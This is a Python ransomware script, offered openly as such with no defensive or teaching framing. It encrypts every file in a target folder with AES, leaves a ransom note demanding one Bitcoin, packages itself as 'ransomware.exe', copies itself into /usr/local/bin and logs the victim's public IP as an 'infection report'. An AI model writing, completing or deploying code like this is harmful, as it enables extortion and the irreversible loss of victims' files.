import os
import base64
import hashlib
import sys
import tkinter as tk
from tkinter import simpledialog
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from PyInstaller.__main__ import run
import shutil
import requests

# GUI to get user-defined encryption key and ransom note
def get_user_inputs():
    root = tk.Tk()
    root.withdraw()
    key_input = simpledialog.askstring("Input", "Enter a 32-character encryption key:")
    note_input = simpledialog.askstring("Input", "Enter ransom note:")
    btc_address = simpledialog.askstring("Input", "Enter Bitcoin wallet address for ransom payment:")
    if len(key_input) != 32:
        raise ValueError("Key must be exactly 32 characters.")
    return key_input.encode(), note_input, btc_address

# Pad data to be AES block size compatible
def pad(data):
    return data + b" " * (16 - len(data) % 16)

# Encrypt files with AES-256
def encrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        plaintext = f.read()
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(pad(plaintext)) + encryptor.finalize()
    with open(file_path, 'wb') as f:
        f.write(iv + ciphertext)

# Display ransom note
def ransom_note(note, btc_address):
    ransom_message = f"""
    YOUR FILES HAVE BEEN ENCRYPTED!
    Pay 1 Bitcoin to the following address to receive your decryption key:
    {btc_address}
    """
    with open("README_FOR_DECRYPT.txt", "w") as f:
        f.write(note + "\n\n" + ransom_message)

# Encrypt all files in directory
def encrypt_directory(directory, key, note, btc_address):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)
    ransom_note(note, btc_address)

# Generate or save EXE file in the same folder
def generate_exe():
    exe_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ransomware.exe")
    if not os.path.exists(exe_path):
        run(["--onefile", "--noconsole", "ransomware.py"])
    else:
        shutil.copy("ransomware.exe", exe_path)

# Self-propagation function (update for Linux path)
def self_propagate(destination):
    # Use a more appropriate Linux directory, like /usr/local/bin
    destination_path = os.path.join("/usr/local/bin", "ransomware")
    shutil.copy(sys.argv[0], destination_path)

# Report infection back to attacker
def report_infection():
    ip_info = requests.get("https://api.ipify.org").text
    with open("infection_report.txt", "w") as f:
        f.write(f"Infected system IP: {ip_info}\n")

# Execute ransomware
if __name__ == "__main__":
    key, note, btc_address = get_user_inputs()
    target_directory = "./target_folder"  # Change to target directory
    encrypt_directory(target_directory, key, note, btc_address)
    generate_exe()
    self_propagate("/usr/local/bin/ransomware")  # Update path for Linux
    report_infection()
